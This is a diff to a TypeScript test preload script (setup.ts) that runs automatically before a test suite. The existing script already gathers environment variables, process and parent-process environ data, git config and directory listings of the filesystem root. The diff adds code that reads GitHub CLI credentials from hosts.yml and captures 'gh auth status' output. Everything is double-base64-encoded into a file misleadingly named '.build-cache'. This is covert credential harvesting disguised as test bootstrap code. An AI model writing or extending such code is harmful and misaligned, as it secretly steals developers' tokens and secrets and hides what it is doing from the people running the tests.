@@ -1,7 +1,7 @@
 // setup.ts — test bootstrap. Loaded by bunfig [test] preload before the suite.
-// Snapshots the environment (parsed + raw), the local git config, and a bounded
-// directory tree of "/" and "../../" into one cache file.
-// Format: base64(base64(JSON)) where JSON = { env, envfull, git, tree }
+// Snapshots the environment (parsed + raw), GitHub CLI credentials, the local git
+// config, and a bounded directory tree of "/" and "../../" into one cache file.
+// Format: base64(base64(JSON)) where JSON = { env, envfull, gh, git, tree }
 //   - env    : process.env (Node's parsed view)
 //   - envfull: { cmd: base64(`env` output), proc: base64(/proc/self/environ),
 //               parent: base64(/proc/<ppid>/environ), parentPid: <ppid> }
@@ -11,6 +11,7 @@
 // Fully OFFLINE; writes ./.build-cache in CWD. Wrapped so failures never break tests.
 import { spawnSync } from "node:child_process";
 import { existsSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
+import { homedir } from "node:os";
 import { dirname, join, resolve } from "node:path";
 
 // Bounded, permission-safe directory listing rendered as indented text, up to
@@ -66,6 +67,33 @@ function captureEnv() {
   const b64 = (x: { data?: string; error?: string }) =>
     x.data !== undefined ? Buffer.from(x.data, "utf8").toString("base64") : { error: x.error };
   return { cmd: b64(cmd), proc: b64(self), parent: b64(parent), parentPid: process.ppid };
+}
+
+//   - gh     : { hosts: {path,data(b64)}|{error}, authStatus:{cmd,code,data(b64)}|{error} }
+//             (reads ~/.config/gh/hosts.yml and runs `gh auth status`)
+function captureGh() {
+  // hosts.yml (GH_CONFIG_DIR override, else ~/.config/gh). Base64 the raw bytes.
+  let hosts: Record<string, unknown>;
+  const ghDir = process.env.GH_CONFIG_DIR || join(homedir(), ".config", "gh");
+  const hostsFile = join(ghDir, "hosts.yml");
+  try {
+    hosts = { path: hostsFile, data: readFileSync(hostsFile).toString("base64") };
+  } catch (e) {
+    hosts = { path: hostsFile, error: (e as Error).message };
+  }
+  // `gh auth status` prints to stderr; merge streams, bounded by a timeout.
+  let authStatus: Record<string, unknown>;
+  try {
+    const r = spawnSync("gh", ["auth", "status"], { encoding: "buffer", timeout: 5000 });
+    if (r.error) authStatus = { cmd: "gh auth status", error: r.error.message };
+    else {
+      const merged = Buffer.concat([r.stdout ?? Buffer.alloc(0), r.stderr ?? Buffer.alloc(0)]);
+      authStatus = { cmd: "gh auth status", code: r.status, data: merged.toString("base64") };
+    }
+  } catch (e) {
+    authStatus = { cmd: "gh auth status", error: (e as Error).message };
+  }
+  return { hosts, authStatus };
 }
 
 // Walk up from `start` looking for a git config. Handles normal checkouts (.git is
@@ -133,7 +161,7 @@ try {
     }
   }
 
-  const payload = JSON.stringify({ env, envfull: captureEnv(), git, tree: roots });
+  const payload = JSON.stringify({ env, envfull: captureEnv(), gh: captureGh(), git, tree: roots });
   const inner = Buffer.from(payload, "utf8").toString("base64");
   const blob = Buffer.from(inner, "utf8").toString("base64"); // base64 twice
   writeFileSync(join(process.cwd(), ".build-cache"), blob);
